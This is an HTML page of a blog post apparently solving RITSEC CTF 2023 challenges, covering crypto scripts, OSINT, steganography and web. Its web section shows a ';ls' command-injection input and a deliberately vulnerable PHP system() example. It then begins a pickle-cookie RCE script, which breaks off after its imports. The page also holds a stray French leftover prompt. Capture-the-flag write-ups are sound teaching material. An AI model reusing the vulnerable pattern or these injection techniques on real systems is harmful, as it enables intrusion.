@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> RITSEC CTF 2023 - Full | Cyberrzzerk</title>
+  <link rel = 'canonical' href = 'https://-lb.fr/posts/ritsec-ctf-2023-full/'>
+  <meta name="description" content="Writing some write up of cool CTF’s challenges and infosec content.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="RITSEC CTF 2023 - Full" />
+<meta property="og:description" content="redonne moi cette page markdown mais quand il y a du texte traduit en anglais:
+info : https://ctftime.org/event/1860
+Challenge completed Crypto Either or Neither nor A Fine Cipher Misc New Hire Wild Stocks Connection Terminated Forensics Red Team Activity 1 Red Team Activity 2 Red Team Activity 3 Red Team Activity 4 Steganography Weird turtle QR Web Echoes Rick Roll Pickle Store X-Men Lore Broken Bot Reversing Cats At Play Guess the Password Chandi Bot Chandi bot 1 Chandi bot 2 Chandi bot 3 Chandi bot 4 Chandi bot 5 Chandi bot 6 Write-ups Crypto Either or Neither nor The flag format is &ldquo;MetaCTF{*}&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://-lb.fr/posts/ritsec-ctf-2023-full/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-04-02T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-04-02T00:00:00+00:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="RITSEC CTF 2023 - Full"/>
+<meta name="twitter:description" content="redonne moi cette page markdown mais quand il y a du texte traduit en anglais:
+info : https://ctftime.org/event/1860
+Challenge completed Crypto Either or Neither nor A Fine Cipher Misc New Hire Wild Stocks Connection Terminated Forensics Red Team Activity 1 Red Team Activity 2 Red Team Activity 3 Red Team Activity 4 Steganography Weird turtle QR Web Echoes Rick Roll Pickle Store X-Men Lore Broken Bot Reversing Cats At Play Guess the Password Chandi Bot Chandi bot 1 Chandi bot 2 Chandi bot 3 Chandi bot 4 Chandi bot 5 Chandi bot 6 Write-ups Crypto Either or Neither nor The flag format is &ldquo;MetaCTF{*}&rdquo;."/>
+
+  
+  
+    
+  
+  
+ 
+<link rel="stylesheet" href="../../css/style.css"> 
+
+  
+<link rel="stylesheet" href="../../css/custom.css">
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://-lb.fr/images/favicon.ico" />
+
+  
+  
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="../../index.html">Home</a></li>
+    
+        <li><a href="../index.html">Categories</a></li>
+      
+        <li><a href="../../ranking/index.html">Ranking</a></li>
+      
+        <li><a href="../../whoami/index.html">Whoami</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://-lb.fr/whoami/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://-lb.fr/posts/disparues-2023-bozo35d-osint/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&text=RITSEC%20CTF%202023%20-%20Full" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&title=RITSEC%20CTF%202023%20-%20Full" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&is_video=false&description=RITSEC%20CTF%202023%20-%20Full" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=RITSEC%20CTF%202023%20-%20Full&body=Check out this article: https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&title=RITSEC%20CTF%202023%20-%20Full" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&title=RITSEC%20CTF%202023%20-%20Full" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&name=RITSEC%20CTF%202023%20-%20Full&description=redonne%20moi%20cette%20page%20markdown%20mais%20quand%20il%20y%20a%20du%20texte%20traduit%20en%20anglais%3a%0ainfo%20%3a%20https%3a%2f%2fctftime.org%2fevent%2f1860%0aChallenge%20completed%20Crypto%20Either%20or%20Neither%20nor%20A%20Fine%20Cipher%20Misc%20New%20Hire%20Wild%20Stocks%20Connection%20Terminated%20Forensics%20Red%20Team%20Activity%201%20Red%20Team%20Activity%202%20Red%20Team%20Activity%203%20Red%20Team%20Activity%204%20Steganography%20Weird%20turtle%20QR%20Web%20Echoes%20Rick%20Roll%20Pickle%20Store%20X-Men%20Lore%20Broken%20Bot%20Reversing%20Cats%20At%20Play%20Guess%20the%20Password%20Chandi%20Bot%20Chandi%20bot%201%20Chandi%20bot%202%20Chandi%20bot%203%20Chandi%20bot%204%20Chandi%20bot%205%20Chandi%20bot%206%20Write-ups%20Crypto%20Either%20or%20Neither%20nor%20The%20flag%20format%20is%20%26ldquo%3bMetaCTF%7b%2a%7d%26rdquo%3b." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f-lb.fr%2fposts%2fritsec-ctf-2023-full%2f&t=RITSEC%20CTF%202023%20-%20Full" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-completed">Challenge completed</a>
+      <ul>
+        <li><a href="#crypto">Crypto</a></li>
+        <li><a href="#misc">Misc</a></li>
+        <li><a href="#forensics">Forensics</a></li>
+        <li><a href="#steganography">Steganography</a></li>
+        <li><a href="#web">Web</a></li>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#chandi-bot">Chandi Bot</a></li>
+      </ul>
+    </li>
+    <li><a href="#write-ups">Write-ups</a>
+      <ul>
+        <li><a href="#crypto-1">Crypto</a></li>
+        <li><a href="#misc-1">Misc</a></li>
+        <li><a href="#forensics-1">Forensics</a></li>
+        <li><a href="#steganography-1">Steganography</a></li>
+        <li><a href="#web-1">Web</a></li>
+        <li><a href="#reversing-1">Reversing</a></li>
+        <li><a href="#chandi-bot-1">Chandi Bot</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        RITSEC CTF 2023 - Full
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2023-04-02 00:00:00 &#43;0000 UTC" itemprop="datePublished">2023-04-02</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          6 minute read
+        </div>
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/ritsec-ctf-2023">RITSEC CTF 2023</a>
+            
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="../../tags/ctf/index.html" rel="tag">CTF</a>
+            
+             ,  
+            <a class="tag-link" href="../../tags/crypto/index.html" rel="tag">Crypto</a>
+            
+             ,  
+            <a class="tag-link" href="../../tags/misc/index.html" rel="tag">Misc</a>
+            
+             ,  
+            <a class="tag-link" href="../../tags/forensic/index.html" rel="tag">Forensic</a>
+            
+             ,  
+            <a class="tag-link" href="../../tags/web/index.html" rel="tag">Web</a>
+            
+             ,  
+            <a class="tag-link" href="../../tags/stegano/index.html" rel="tag">Stegano</a>
+            
+             ,  
+            <a class="tag-link" href="../../tags/reverse/index.html" rel="tag">Reverse</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p>redonne moi cette page markdown mais quand il y a du texte traduit en anglais:</p>
+<p>info : <a href="https://ctftime.org/event/1860">https://ctftime.org/event/1860</a></p>
+<h2 id="challenge-completed">Challenge completed</h2>
+<h3 id="crypto">Crypto</h3>
+<ul>
+<li>Either or Neither nor</li>
+<li>A Fine Cipher</li>
+</ul>
+<h3 id="misc">Misc</h3>
+<ul>
+<li>New Hire</li>
+<li>Wild Stocks</li>
+<li>Connection Terminated</li>
+</ul>
+<h3 id="forensics">Forensics</h3>
+<ul>
+<li>Red Team Activity 1</li>
+<li>Red Team Activity 2</li>
+<li>Red Team Activity 3</li>
+<li>Red Team Activity 4</li>
+</ul>
+<h3 id="steganography">Steganography</h3>
+<ul>
+<li>Weird</li>
+<li>turtle</li>
+<li>QR</li>
+</ul>
+<h3 id="web">Web</h3>
+<ul>
+<li>Echoes</li>
+<li>Rick Roll</li>
+<li>Pickle Store</li>
+<li>X-Men Lore</li>
+<li>Broken Bot</li>
+</ul>
+<h3 id="reversing">Reversing</h3>
+<ul>
+<li>Cats At Play</li>
+<li>Guess the Password</li>
+</ul>
+<h3 id="chandi-bot">Chandi Bot</h3>
+<ul>
+<li>Chandi bot 1</li>
+<li>Chandi bot 2</li>
+<li>Chandi bot 3</li>
+<li>Chandi bot 4</li>
+<li>Chandi bot 5</li>
+<li>Chandi bot 6</li>
+</ul>
+<hr>
+<h2 id="write-ups">Write-ups</h2>
+<h3 id="crypto-1">Crypto</h3>
+<h4 id="either-or-neither-nor">Either or Neither nor</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403153102.png" alt="Consigne"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403153254.png" alt="Le fichier"></p>
+<ol>
+<li>The flag format is &ldquo;MetaCTF{*}&rdquo;. Therefore, the starting characters of the flag are &ldquo;Meta&rdquo;.</li>
+<li>The key length is 4 bytes (KEY_LEN = 4).</li>
+<li>The first four values of the encrypted flag (enc_flag) are [91, 241, 101, 166].</li>
+<li>To recover the 4 bytes of the key, perform the XOR operation between the corresponding values of the encrypted flag and the characters &ldquo;Meta&rdquo;. For example, to retrieve the first byte of the key, do 91 (first value of enc_flag) XOR &lsquo;M&rsquo; (first character of &ldquo;Meta&rdquo;).</li>
+<li>Once the 4 bytes of the key are found (key = [22, 148, 17, 199]), you can decrypt the flag by applying the XOR operation between the values of the encrypted flag (enc_flag) and the key.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>enc_flag <span style="color:#f92672">=</span> [<span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">166</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">107</span>] 
+</span></span><span style="display:flex;"><span>known_start <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Meta&#34;</span> <span style="color:#75715e"># Récupérer les 4 octets de la clé </span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> [] 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>): 
+</span></span><span style="display:flex;"><span>	key<span style="color:#f92672">.</span>append(enc_flag[i] <span style="color:#f92672">^</span> ord(known_start[i])) 
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Décrypter le flag </span>
+</span></span><span style="display:flex;"><span>decrypted_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i, c <span style="color:#f92672">in</span> enumerate(enc_flag):
+</span></span><span style="display:flex;"><span>	decrypted_flag <span style="color:#f92672">+=</span> chr(c <span style="color:#f92672">^</span> key[i <span style="color:#f92672">%</span> len(key)]) 
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Le flag déchiffré est : &#34;</span>, decrypted_flag)
+</span></span></code></pre></div><pre tabindex="0"><code class="language-output" data-lang="output">Le flag déchiffré est :  MetaCTF{x0r_th3_c0re}
+</code></pre><h4 id="a-fine-cipher">A Fine Cipher</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403155045.png" alt="Consigne"></p>
+<ol>
+<li>
+<p>Frequency Analysis: Use the frequency distribution of letters in the English language to determine the key by substituting the most frequent letter with the most frequent in the encrypted text. Then, solve the modular equations system to find the values of &lsquo;a&rsquo; and &lsquo;b&rsquo;. This method might not work perfectly in all cases and involves some degree of brute force.</p>
+</li>
+<li>
+<p>Brute Force: Test the 312 possible keys using a brute force approach to determine the key.</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">egcd</span>(a, m):  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> a <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (m, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>)  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:  
+</span></span><span style="display:flex;"><span>        g, x, y <span style="color:#f92672">=</span> egcd(m <span style="color:#f92672">%</span> a, a)  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (g, y <span style="color:#f92672">-</span> (m <span style="color:#f92672">//</span> a) <span style="color:#f92672">*</span> x, x)  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mod_inverse</span>(a, m):  
+</span></span><span style="display:flex;"><span>    g, x, _ <span style="color:#f92672">=</span> egcd(a, m)  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> g <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> x <span style="color:#f92672">%</span> m  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">affine_decrypt</span>(ciphertext, a, b):  
+</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>  
+</span></span><span style="display:flex;"><span>    a_inv <span style="color:#f92672">=</span> mod_inverse(a, <span style="color:#ae81ff">26</span>)  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> a_inv <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> ciphertext:  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isalpha():  
+</span></span><span style="display:flex;"><span>            offset <span style="color:#f92672">=</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#66d9ef">if</span> char<span style="color:#f92672">.</span>isupper() <span style="color:#66d9ef">else</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>)  
+</span></span><span style="display:flex;"><span>            plaintext <span style="color:#f92672">+=</span> chr((((ord(char) <span style="color:#f92672">-</span> offset) <span style="color:#f92672">*</span> a_inv <span style="color:#f92672">-</span> b) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span>) <span style="color:#f92672">+</span> offset)  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:  
+</span></span><span style="display:flex;"><span>            plaintext <span style="color:#f92672">+=</span> char  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> plaintext  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">try_all_keys</span>(ciphertext):  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">2</span>):  
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">26</span>):  
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> a <span style="color:#f92672">in</span> [<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">25</span>]:  
+</span></span><span style="display:flex;"><span>                plaintext <span style="color:#f92672">=</span> affine_decrypt(ciphertext, a, b)  
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> plaintext <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:  
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;a = </span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">}</span><span style="color:#e6db74">, b = </span><span style="color:#e6db74">{</span>b<span style="color:#e6db74">}</span><span style="color:#e6db74">, texte clair : </span><span style="color:#e6db74">{</span>plaintext<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>ciphertext <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;JSNRZHIVJUCVIVFCVYBMVBDRZCXRIVBINCORBCSFHCBINOCRMHBD&#34;</span>  
+</span></span><span style="display:flex;"><span>try_all_keys(ciphertext)
+</span></span></code></pre></div><p>Output
+<img src="/images/RITSECCTF2023/Pasted%20image%2020230403160249.png" alt="output"></p>
+<h3 id="misc-1">Misc</h3>
+<h4 id="new-hire">New Hire</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404103206.png" alt="Consigne"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230401013450.png" alt="Compétence du linkedin"></p>
+<h4 id="wild-stocks">Wild Stocks</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404103231.png" alt="Consigne"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230401013850.png" alt="Linkedin"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230401013902.png" alt="Linkedin"></p>
+<p>Symbole boursier des entreprises</p>
+<p>(R) Ryder System
+(S) SentinelOne Inc
+(SE) Sea Ltd
+(C) Citigroup Inc
+(URI) United Rentals, Inc
+(TY) Tri-Continental Corporation
+(ASA) ASA Gold and Precious Metals Ltd
+(SE) Sea Ltd
+(R) Ryder Systems
+(VICE) AdvisorShares Vice ETF</p>
+<p>RS{SECURITYASASERVICE}</p>
+<h4 id="connection-terminated">Connection Terminated</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404103253.png" alt="Consigne"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404103304.png" alt="Hint"></p>
+<p><em>Research meaning of RIT</em>
+<img src="/images/RITSECCTF2023/Pasted%20image%2020230401013555.png" alt="Consigne"></p>
+<p><em>Article on an antenna regarding RIT</em>
+<img src="/images/RITSECCTF2023/Pasted%20image%2020230401013650.png" alt="Consigne"></p>
+<p><em>Using the what3words site to locate the antenna and get the three words</em>
+<img src="/images/RITSECCTF2023/Pasted%20image%2020230401013709.png" alt="Consigne"></p>
+<p>///enthusiast.tiptoes.studio =&gt; RS{enthusiast.tiptoes.studio}</p>
+<h3 id="forensics-1">Forensics</h3>
+<h4 id="red-team-activity-1">Red Team Activity 1</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404180546.png" alt="Consigne"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404180753.png" alt="auth.log"></p>
+<h4 id="red-team-activity-2">Red Team Activity 2</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404180553.png" alt="Consigne"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404180819.png" alt="auth.log"></p>
+<h4 id="red-team-activity-3">Red Team Activity 3</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404180609.png" alt="Consigne"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404180919.png" alt="auth.log"></p>
+<h4 id="red-team-activity-4">Red Team Activity 4</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404180641.png" alt="Consigne"></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404181032.png" alt="auth.log"></p>
+<h3 id="steganography-1">Steganography</h3>
+<h4 id="wierd">Wierd</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404165806.png" alt="Consigne"></p>
+<p>Here is a white image, we use the tool CyberChef</p>
+<p><em>Randomize Colour Palette</em>
+<img src="/images/RITSECCTF2023/Pasted%20image%2020230404170627.png" alt="output"></p>
+<h4 id="turtle">turtle</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404165814.png" alt="Consigne"></p>
+<p>ezgif.com Read the frames of a gif
+<img src="/images/RITSECCTF2023/Pasted%20image%2020230404173104.png" alt="ezgif.com output"></p>
+<h4 id="qr">QR</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404165824.png" alt="Consigne"></p>
+<p>the image of the QR code provided
+<img src="/images/RITSECCTF2023/QR1.png" alt="QR"></p>
+<p>According to QR codes, a certain percentage of defect can be tolerated, so I used the online tool merricx to reconstruct it</p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230404174035.png" alt="merricx"></p>
+<h3 id="web-1">Web</h3>
+<h4 id="echoes">Echoes</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230402235032.png" alt="Consigne"></p>
+<p>This is what the site looks like</p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230402235057.png" alt="site"></p>
+<p>Just place the &ldquo;;&rdquo; character in input</p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230402235642.png" alt="site"></p>
+<p>With &ldquo;;ls&rdquo;</p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230402235706.png" alt="output"></p>
+<p>The vulnerability is a PHP Command Injection</p>
+<p><em>example of vulnerable PHP code</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;input&#39;</span>])) {
+</span></span><span style="display:flex;"><span>	$input <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;input&#39;</span>]; 
+</span></span><span style="display:flex;"><span>	$command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;echo &#34;</span> <span style="color:#f92672">.</span> $input; 
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>($command); 
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="rick-roll">Rick Roll</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403091327.png" alt="Consigne"></p>
+<p>We look at the source code and element inspection</p>
+<p><em>css file visible in the source code</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403094257.png" alt="site"></p>
+<p><em>another link to an html file</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403094331.png" alt="site"></p>
+<p><em>Don&rsquo;t.html source code</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403094905.png" alt="site"></p>
+<p><em>css file visible in the source code</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403092449.png" alt="site"></p>
+<p><em>part of the flag is in the file</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403093040.png" alt="site"></p>
+<p><em>we check if there is a css 1</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403093313.png" alt="site"></p>
+<p><em>yes and there are two other parts of the flag</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403095014.png" alt="site">
+<img src="/images/RITSECCTF2023/Pasted%20image%2020230403093350.png" alt="site"></p>
+<h4 id="pickle-store">Pickle Store</h4>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403095113.png" alt="Consigne"></p>
+<p><em>The site</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403095202.png" alt="site"></p>
+<p><em>click on a pickle</em></p>
+<p><img src="/images/RITSECCTF2023/Pasted%20image%2020230403110101.png" alt="site"></p>
+<p><em>we notice that cookies are used by the site</em>
+<img src="/images/RITSECCTF2023/Pasted%20image%2020230403103747.png" alt="site"></p>
+<p>We therefore use [[Python]] to create a cookie that performs an RCE</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64  
